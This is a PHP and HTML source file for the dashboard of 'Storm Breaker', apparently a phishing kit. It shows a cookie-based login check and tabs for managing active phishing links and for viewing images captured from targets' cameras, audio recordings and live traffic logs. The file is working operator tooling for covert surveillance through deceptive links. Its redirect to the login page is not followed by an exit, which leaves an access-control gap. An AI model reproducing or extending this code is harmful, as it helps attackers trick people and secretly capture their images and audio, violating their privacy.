<?php
session_start();
include "./assets/components/login-arc.php";

if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }
}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);
}
else {
    header('location: login.php');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Storm Breaker | Dashboard</title>
    <link rel="stylesheet" href="./assets/css/modern-theme.css">
    <link rel="stylesheet" href="./assets/css/tabs.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Courier+Prime&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body id="ourbody" onload="check_new_version()">

<div class="dashboard-container">
    <!-- Sidebar -->
    <div class="sidebar">
        <div class="sidebar-header">
            <h3>Storm Breaker</h3>
        </div>
        <ul class="nav-menu">
            <li class="nav-item">
                <a href="#" class="nav-link active">
                    <i class="fas fa-bolt"></i> Dashboard
                </a>
            </li>
            <li class="nav-item">
                <a href="#" class="nav-link">
                    <i class="fas fa-terminal"></i> Logs
                </a>
            </li>
            <li class="nav-item">
                <a href="#" class="nav-link">
                    <i class="fas fa-cog"></i> Settings
                </a>
            </li>
        </ul>
        <div class="nav-item">
            <a href="logout.php" class="nav-link" style="color: #ef4444;">
                <i class="fas fa-sign-out-alt"></i> Logout
            </a>
        </div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <!-- Top Bar -->
        <div class="top-bar">
            <div class="page-title">
                <h1>Dashboard</h1>
            </div>
            <div class="user-profile">
                <span><?php echo htmlspecialchars($_SESSION['IAm-logined']); ?></span>
                <div class="user-avatar"><?php echo strtoupper(substr($_SESSION['IAm-logined'], 0, 1)); ?></div>
            </div>
        </div>

        <!-- Stats Row -->
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
            <div class="card" style="margin-bottom: 0; padding: 20px;">
                <div style="color: var(--text-muted); font-size: 0.9rem;">Status</div>
                <div style="font-size: 1.5rem; font-weight: 700; color: #10b981;">Active</div>
            </div>
            <div class="card" style="margin-bottom: 0; padding: 20px;">
                <div style="color: var(--text-muted); font-size: 0.9rem;">Port</div>
                <div style="font-size: 1.5rem; font-weight: 700;">2525</div>
            </div>
            <div class="card" style="margin-bottom: 0; padding: 20px;">
                <div style="color: var(--text-muted); font-size: 0.9rem;">Session ID</div>
                <div style="font-size: 1.5rem; font-weight: 700; color: #3b82f6;">#8X92</div>
            </div>
        </div>

        <!-- Tab Navigation -->
        <div class="tab-navigation">
            <button class="tab-btn active" data-tab="links">
                <i class="fas fa-link"></i> Phishing Links
            </button>
            <button class="tab-btn" data-tab="images">
                <i class="fas fa-images"></i> Images
            </button>
            <button class="tab-btn" data-tab="audio">
                <i class="fas fa-volume-up"></i> Audio
            </button>
            <button class="tab-btn" data-tab="traffic">
                <i class="fas fa-chart-line"></i> Live Traffic
            </button>
        </div>

        <!-- Tab Content -->
        <div class="tab-content active" id="tab-links">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Active Phishing Links</h3>
                </div>
                <div id="links-container">
                    <!-- Links will be injected here by JS -->
                </div>
            </div>
        </div>

        <div class="tab-content" id="tab-images">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Captured Images</h3>
                    <div class="control-bar">
                        <button class="btn-control btn-primary" id="btn-refresh-images">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn-control btn-danger" id="btn-clear-images">
                            <i class="fas fa-trash"></i> Clear All
                        </button>
                    </div>
                </div>
                <div id="images-gallery" class="images-gallery">
                    <div class="no-content">
                        <i class="fas fa-camera"></i>
                        <p>No images captured yet</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="tab-audio">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Audio Recordings</h3>
                    <div class="control-bar">
                        <button class="btn-control btn-primary" id="btn-refresh-audio">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn-control btn-danger" id="btn-clear-audio">
                            <i class="fas fa-trash"></i> Clear All
                        </button>
                    </div>
                </div>
                <div id="audio-list" class="audio-list">
                    <div class="no-content">
                        <i class="fas fa-microphone"></i>
                        <p>No audio recordings yet</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="tab-traffic">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Live Traffic Logs</h3>
                    <div class="control-bar">
                        <button class="btn-control btn-danger" id="btn-listen">
                            <i class="fas fa-stop"></i> Stop
                        </button>
                        <button class="btn-control btn-success" id="btn-download" onclick="saveTextAsFile(getFullLogs(),'log.txt')">
                            <i class="fas fa-download"></i> Save
                        </button>
                        <button class="btn-control btn-warning" id="btn-clear">
                            <i class="fas fa-trash"></i> Clear
                        </button>
                    </div>
                </div>
                <div class="log-terminal" id="log-terminal">
                    <div class="log-entry">
                        <span class="log-time">[System]</span>
                        <span class="log-content">Waiting for interactions...</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>
<script src="./assets/js/script.js"></script>
</body>
</html>